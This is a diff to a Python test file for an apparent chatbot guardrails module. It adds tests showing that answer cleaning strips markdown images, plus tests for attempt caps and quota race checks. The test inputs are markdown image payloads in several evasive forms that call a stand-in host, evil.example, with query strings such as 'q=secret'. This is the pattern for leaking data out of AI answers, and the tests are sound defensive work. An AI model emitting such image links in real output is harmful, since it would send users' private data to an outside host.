@@ -141,10 +141,41 @@ def test_job_slots(monkeypatch):
         pass
 
 
-def test_clean_answer_drops_images():
-    text = "See ![chart](https://evil.example/x?q=secret) and ![ref][1] here."
-    assert guardrails.clean_answer(text) == "See chart and ref here."
-    assert guardrails.clean_answer("A [link](https://example.com) stays.") == "A [link](https://example.com) stays."
+@pytest.mark.parametrize("text", [
+    "See ![chart](https://evil.example/x?q=secret) here.",
+    "![ref][1]\n\n[1]: https://evil.example/?q=2",
+    "![ref]\n\n[ref]: https://evil.example/?q=3",          # shortcut reference
+    "![a[b]c](https://evil.example/?q=4)",                  # nested brackets
+    "![a\\]b](https://evil.example/?q=5)",                  # escaped bracket
+    "[![x][r]][r]\n\n[r]: https://evil.example/?q=6",       # image inside a link
+])
+def test_clean_answer_neutralises_every_image(text):
+    from markdown_it import MarkdownIt
+    html = MarkdownIt("commonmark").render(guardrails.clean_answer(text))
+    assert "<img" not in html
+
+
+def test_clean_answer_keeps_ordinary_text():
+    assert guardrails.clean_answer("A [link](https://example.com) stays. Wow!") == \
+        "A [link](https://example.com) stays. Wow!"
+
+
+def test_failed_attempts_are_capped(friend, monkeypatch):
+    monkeypatch.setenv("VIDEOS_PER_DAY", "1")
+    get_settings.cache_clear()
+    for _ in range(3):
+        guardrails.start_attempt(friend)
+    with pytest.raises(QuotaExceeded, match="attempts"):
+        guardrails.start_attempt(friend)
+
+
+def test_charge_rechecks_video_count(friend, monkeypatch):
+    monkeypatch.setenv("VIDEOS_PER_DAY", "1")
+    get_settings.cache_clear()
+    guardrails.check_can_start_video(friend)   # two tabs both pass this...
+    guardrails.charge_video(friend, 5)
+    with pytest.raises(QuotaExceeded):          # ...but only one gets charged
+        guardrails.charge_video(friend, 5)
 
 
 def test_user_message_hides_internals():
